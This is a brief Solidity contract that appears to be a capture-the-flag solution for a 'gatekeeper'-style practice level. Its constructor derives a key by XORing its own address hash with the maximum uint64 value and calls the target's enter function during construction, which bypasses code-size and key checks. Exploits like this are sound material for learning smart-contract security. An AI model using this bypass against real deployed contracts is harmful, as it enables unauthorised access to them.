// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatePassTwo {
    constructor(address _gateAddr) public {
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0) - 1);
        address(_gateAddr).call(abi.encodeWithSignature("enter(bytes8)", key));
    }
}